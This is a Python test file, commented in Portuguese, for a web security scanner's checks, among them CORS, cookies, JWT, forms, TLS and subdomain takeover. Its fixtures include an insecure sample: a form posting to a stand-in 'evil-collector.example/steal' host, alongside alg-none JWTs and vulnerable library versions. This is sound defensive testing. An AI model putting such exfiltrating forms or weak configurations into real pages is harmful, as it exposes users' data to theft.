"""KL-149 — 14 checks novos do Security Gate (CORS, cookies, redirects, rate limit, error
disclosure, JWT, forms, DNS, dependencies, TLS ciphers, subdomain, infra URLs). 1 PASS + 1 FAIL
(no mínimo) por check. Offline: httpx.MockTransport para HTTP; helpers de DNS/TLS/CNAME mockados."""
from __future__ import annotations

import asyncio
import base64
import json

import httpx

from security_gate.checks.cookies import check_cookies
from security_gate.checks.cors import check_cors
from security_gate.checks.dependencies import check_dependencies, _version_matches
from security_gate.checks import dns_security as dnsmod
from security_gate.checks.error_disclosure import check_error_disclosure
from security_gate.checks.form_security import check_form_security
from security_gate.checks.https_redirect import check_https_redirect
from security_gate.checks.infrastructure_urls import check_infrastructure_urls
from security_gate.checks.jwt_analysis import check_jwt
from security_gate.checks.rate_limit import check_rate_limit
from security_gate.checks import redirect as redirmod
from security_gate.checks.redirect import check_open_redirect
from security_gate.checks import subdomain as submod
from security_gate.checks.subdomain import check_subdomain_takeover
from security_gate.checks import tls_ciphers as tlsmod
from security_gate.checks.tls_ciphers import check_tls_ciphers
from security_gate.config import GateConfig
from security_gate.models import Severity, Status

BASE = "https://x.test"


def _run(coro):
    return asyncio.run(coro)


def _client(handler):
    return httpx.AsyncClient(transport=httpx.MockTransport(handler), follow_redirects=True)


def _find(results, check):
    return next(r for r in results if r.check == check)


def _has(results, check):
    return any(r.check == check for r in results)


# =========================================================================== #
# 1. CORS
# =========================================================================== #

def _cors_handler(acao=None, acac=None, reflect=False):
    def _h(request):
        h = {}
        if reflect:
            h["access-control-allow-origin"] = request.headers.get("origin", "")
        elif acao is not None:
            h["access-control-allow-origin"] = acao
        if acac is not None:
            h["access-control-allow-credentials"] = acac
        return httpx.Response(200, headers=h)
    return _h


async def _cors(handler):
    async with _client(handler) as c:
        return await check_cors(c, BASE)


def test_cors_reflect_fail_critical():
    r = _find(_run(_cors(_cors_handler(reflect=True))), "cors_reflect")
    assert r.status == Status.FAIL and r.severity == Severity.CRITICAL


def test_cors_wildcard_creds_fail_critical():
    r = _find(_run(_cors(_cors_handler(acao="*", acac="true"))), "cors_wildcard_creds")
    assert r.status == Status.FAIL and r.severity == Severity.CRITICAL


def test_cors_wildcard_fail_high():
    r = _find(_run(_cors(_cors_handler(acao="*"))), "cors_wildcard")
    assert r.status == Status.FAIL and r.severity == Severity.HIGH


def test_cors_ok_pass():
    assert _find(_run(_cors(_cors_handler())), "cors_ok").status == Status.PASS


# =========================================================================== #
# 2. Cookies
# =========================================================================== #

def _cookie_handler(*set_cookies):
    def _h(request):
        return httpx.Response(200, headers=[("set-cookie", c) for c in set_cookies])
    return _h


async def _cookies(handler):
    async with _client(handler) as c:
        return await check_cookies(c, BASE)


def test_cookie_no_httponly_fail_critical():
    r = _find(_run(_cookies(_cookie_handler("sid=abc; Secure; SameSite=Lax"))), "cookie_no_httponly")
    assert r.status == Status.FAIL and r.severity == Severity.CRITICAL


def test_cookies_all_flags_pass():
    res = _run(_cookies(_cookie_handler("sid=abc; HttpOnly; Secure; SameSite=Lax")))
    assert _find(res, "cookies_ok").status == Status.PASS


def test_cookies_skip_analytics():
    # cookie de analytics sem flags NÃO gera finding (não é de sessão).
    res = _run(_cookies(_cookie_handler("_ga=GA1.2.3; Path=/")))
    assert _find(res, "cookies_ok").status == Status.PASS


# =========================================================================== #
# 3. Open redirect
# =========================================================================== #

def _redirect_handler(location=None):
    def _h(request):
        if location is not None:
            return httpx.Response(302, headers={"location": location})
        return httpx.Response(200)
    return _h


async def _redirect(handler):
    async with _client(handler) as c:
        return await check_open_redirect(c, BASE)


def test_open_redirect_fail_high():
    r = _find(_run(_redirect(_redirect_handler(location=redirmod._PROBE))), "open_redirect")
    assert r.status == Status.FAIL and r.severity == Severity.HIGH


def test_open_redirect_ok_pass():
    assert _find(_run(_redirect(_redirect_handler())), "redirect_ok").status == Status.PASS


# =========================================================================== #
# 4. Rate limit
# =========================================================================== #

def _rate_handler(fail_after=None):
    state = {"n": 0}

    def _h(request):
        state["n"] += 1
        if fail_after is not None and state["n"] >= fail_after:
            return httpx.Response(429)
        return httpx.Response(200)
    return _h


async def _rate(handler):
    async with _client(handler) as c:
        return await check_rate_limit(c, BASE, GateConfig(rate_limit_endpoints=["/"]))


def test_rate_limit_ok_pass():
    assert _find(_run(_rate(_rate_handler(fail_after=3))), "rate_limit_ok").status == Status.PASS


def test_rate_limit_missing_fail():
    r = _find(_run(_rate(_rate_handler(fail_after=None))), "rate_limit_missing")
    assert r.status == Status.FAIL and r.severity == Severity.HIGH


# =========================================================================== #
# 5. Error disclosure
# =========================================================================== #

def _err_handler(status=404, body=""):
    def _h(request):
        return httpx.Response(status, text=body)
    return _h


async def _err(handler):
    async with _client(handler) as c:
        return await check_error_disclosure(c, BASE)


def test_error_disclosure_404_leak_fail():
    body = 'Traceback (most recent call last):\n  File "/app/main.py", line 42'
    r = _find(_run(_err(_err_handler(404, body))), "error_disclosure_404")
    assert r.status == Status.FAIL and r.severity == Severity.HIGH


def test_error_disclosure_clean_pass():
    res = _run(_err(_err_handler(404, "<html><body>Página não encontrada</body></html>")))
    assert _find(res, "error_disclosure_ok").status == Status.PASS


# =========================================================================== #
# 6. HTTPS redirect
# =========================================================================== #

def _https_handler(status=301, location="https://x.test/"):
    def _h(request):
        return httpx.Response(status, headers={"location": location} if location else {})
    return _h


async def _https(handler, base=BASE):
    async with _client(handler) as c:
        return await check_https_redirect(c, base)


def test_https_redirect_ok_pass():
    r = _find(_run(_https(_https_handler(301, "https://x.test/"))), "https_redirect_ok")
    assert r.status == Status.PASS and r.severity == Severity.CRITICAL


def test_https_redirect_missing_fail_critical():
    r = _find(_run(_https(_https_handler(200, ""))), "https_redirect_missing")
    assert r.status == Status.FAIL and r.severity == Severity.CRITICAL


def test_https_redirect_http_site_skip():
    res = _run(_https(_https_handler(), base="http://x.test"))
    assert _find(res, "https_redirect_skip").status == Status.SKIP


# =========================================================================== #
# 7. JWT
# =========================================================================== #

def _jwt(header, payload):
    def enc(d):
        return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")
    return f"{enc(header)}.{enc(payload)}.sig"


def _jwt_handler(token=None):
    def _h(request):
        h = [("set-cookie", f"session={token}; HttpOnly")] if token else []
        return httpx.Response(200, headers=h)
    return _h


async def _jwt_check(handler):
    async with _client(handler) as c:
        return await check_jwt(c, BASE)


def test_jwt_alg_none_fail_critical():
    tok = _jwt({"alg": "none"}, {"sub": "1", "exp": 9999999999})
    r = _find(_run(_jwt_check(_jwt_handler(tok))), "jwt_alg_none")
    assert r.status == Status.FAIL and r.severity == Severity.CRITICAL


def test_jwt_no_exp_fail_high():
    tok = _jwt({"alg": "HS256"}, {"sub": "1"})
    r = _find(_run(_jwt_check(_jwt_handler(tok))), "jwt_no_exp")
    assert r.status == Status.FAIL and r.severity == Severity.HIGH


def test_jwt_pii_fail_medium():
    tok = _jwt({"alg": "HS256"}, {"sub": "1", "exp": 9999999999, "email": "a@b.com"})
    r = _find(_run(_jwt_check(_jwt_handler(tok))), "jwt_pii")
    assert r.status == Status.FAIL and r.severity == Severity.MEDIUM


def test_jwt_none_found_pass():
    assert _find(_run(_jwt_check(_jwt_handler())), "jwt_none_found").status == Status.PASS


def test_jwt_valid_pass():
    tok = _jwt({"alg": "HS256"}, {"sub": "1", "exp": 9999999999})
    res = _run(_jwt_check(_jwt_handler(tok)))
    assert _find(res, "jwt_ok").status == Status.PASS


# =========================================================================== #
# 8. Form security
# =========================================================================== #

def _form_handler(html):
    def _h(request):
        return httpx.Response(200, text=html)
    return _h


async def _forms(handler):
    async with _client(handler) as c:
        return await check_form_security(c, BASE)


def test_form_external_fail_critical():
    html = '<form action="https://evil-collector.example/steal" method="post">'
    r = _find(_run(_forms(_form_handler(html))), "form_external")
    assert r.status == Status.FAIL and r.severity == Severity.CRITICAL


def test_form_internal_pass():
    html = '<form action="/scan" method="get"></form>'
    assert _find(_run(_forms(_form_handler(html))), "forms_ok").status == Status.PASS


# =========================================================================== #
# 9-10. DNS (DNSSEC + CAA) — helpers mockados
# =========================================================================== #

class NoAnswer(Exception):   # nome deve casar o `type(exc).__name__` que o check verifica
    pass


async def _dns():
    async with _client(lambda req: httpx.Response(404)) as c:
        return await dnsmod.check_dns_security(c, BASE)


def test_dnssec_present_pass(monkeypatch):
    monkeypatch.setattr(dnsmod, "_query_dnskey", lambda h: True)
    monkeypatch.setattr(dnsmod, "_query_caa", lambda h: ["0 issue \"letsencrypt.org\""])
    res = _run(_dns())
    assert _find(res, "dnssec_ok").status == Status.PASS
    assert _find(res, "caa_ok").status == Status.PASS


def test_dnssec_missing_fail(monkeypatch):
    def _boom(h):
        raise NoAnswer()
    monkeypatch.setattr(dnsmod, "_query_dnskey", _boom)
    monkeypatch.setattr(dnsmod, "_query_caa", _boom)
    res = _run(_dns())
    assert _find(res, "dnssec_missing").status == Status.FAIL
    assert _find(res, "caa_missing").status == Status.FAIL


# =========================================================================== #
# 11. Dependencies (CVE)
# =========================================================================== #

async def _deps(html):
    async with _client(lambda req: httpx.Response(200, text=html)) as c:
        return await check_dependencies(c, BASE)


def test_dependencies_vulnerable_jquery_fail_high():
    res = _run(_deps('<script src="/vendor/jquery-3.4.0.min.js"></script>'))
    r = _find(res, "dep_jquery")
    assert r.status == Status.FAIL and r.severity == Severity.HIGH and "CVE-2020-11022" in r.detail


def test_dependencies_safe_jquery_pass():
    assert _find(_run(_deps('<script src="/vendor/jquery-3.7.1.min.js"></script>')),
                 "deps_ok").status == Status.PASS


def test_dependencies_none_pass():
    assert _find(_run(_deps("<html>no libs</html>")), "deps_ok").status == Status.PASS


def test_version_matches_helper():
    assert _version_matches("3.4.0", "<3.5.0") is True
    assert _version_matches("3.5.0", "<3.5.0") is False
    assert _version_matches("2.29.0", "*") is True


# =========================================================================== #
# 12. TLS ciphers — helper mockado
# =========================================================================== #

async def _tls():
    async with _client(lambda req: httpx.Response(200)) as c:
        return await check_tls_ciphers(c, BASE)


def test_tls_weak_cipher_fail_critical(monkeypatch):
    monkeypatch.setattr(tlsmod, "_accepts_cipher",
                        lambda host, spec, **kw: "RC4-SHA" if spec == "RC4" else None)
    res = _run(_tls())
    assert _has(res, "tls_weak_rc4")
    assert _find(res, "tls_weak_rc4").severity == Severity.CRITICAL


def test_tls_ciphers_ok_pass(monkeypatch):
    monkeypatch.setattr(tlsmod, "_accepts_cipher", lambda host, spec, **kw: None)
    assert _find(_run(_tls()), "tls_ciphers_ok").status == Status.PASS


# =========================================================================== #
# 13. Subdomain takeover — CNAME mockado
# =========================================================================== #

def _sub_client_handler(body=""):
    def _h(request):
        return httpx.Response(200, text=body)
    return _h


async def _sub(handler):
    async with _client(handler) as c:
        return await check_subdomain_takeover(c, BASE)


def test_subdomain_takeover_fail_critical(monkeypatch):
    def _cname(fqdn):
        if fqdn.startswith("www."):
            return ["myapp.herokuapp.com"]
        raise NoAnswer()
    monkeypatch.setattr(submod, "_resolve_cname", _cname)
    res = _run(_sub(_sub_client_handler("No such app\nThere's nothing here")))
    r = _find(res, "subdomain_takeover")
    assert r.status == Status.FAIL and r.severity == Severity.CRITICAL and "herokuapp" in r.detail


def test_subdomain_no_cname_pass(monkeypatch):
    def _boom(fqdn):
        raise NoAnswer()
    monkeypatch.setattr(submod, "_resolve_cname", _boom)
    assert _find(_run(_sub(_sub_client_handler())), "subdomain_ok").status == Status.PASS


# =========================================================================== #
# 14. Infrastructure URLs
# =========================================================================== #

def _infra_handler(routes, headers=None):
    def _h(request):
        p = request.url.path or "/"
        if p == "/":   # homepage — leva os headers (ex.: ngrok-skip-browser-warning)
            return httpx.Response(200, text=routes.get("/", ""), headers=headers or {})
        if p in routes:   # JS mesma-origem
            return httpx.Response(200, text=routes[p])
        return httpx.Response(404)
    return _h


async def _infra(handler):
    async with _client(handler) as c:
        return await check_infrastructure_urls(c, BASE)


def test_infra_cloud_run_in_js_fail_high():
    # Formato NOVO do Cloud Run (multi-label: service-projnum.region.run.app) — o que a Igoove usa.
    routes = {"/": '<script src="/app.js"></script>',
              "/app.js": 'const API = "https://ig-backend-339620555388.southamerica-east1.run.app";'}
    res = _run(_infra(_infra_handler(routes)))
    r = next(r for r in res if r.check.startswith("infra_google_cloud_run"))
    assert r.status == Status.FAIL and r.severity == Severity.HIGH


def test_infra_k8s_internal_fail_critical():
    routes = {"/": '<script src="/app.js"></script>',
              "/app.js": 'fetch("http://api.default.svc.cluster.local:8080/x")'}
    res = _run(_infra(_infra_handler(routes)))
    assert _find(res, "infra_kubernetes_interno").severity == Severity.CRITICAL


def test_infra_dev_header_fail_medium():
    res = _run(_infra(_infra_handler({"/": "<html>ok</html>"},
                                     headers={"ngrok-skip-browser-warning": "1"})))
    r = _find(res, "infra_dev_header")
    assert r.status == Status.FAIL and r.severity == Severity.MEDIUM


def test_infra_own_domain_ignored_pass():
    # URL do PRÓPRIO domínio no JS não é "infra exposta" → PASS.
    routes = {"/": '<script src="/app.js"></script>',
              "/app.js": 'const API = "https://x.test/api";'}
    assert _find(_run(_infra(_infra_handler(routes))), "infra_urls_ok").status == Status.PASS


def test_infra_clean_pass():
    assert _find(_run(_infra(_infra_handler({"/": "<html>clean</html>"}))),
                 "infra_urls_ok").status == Status.PASS
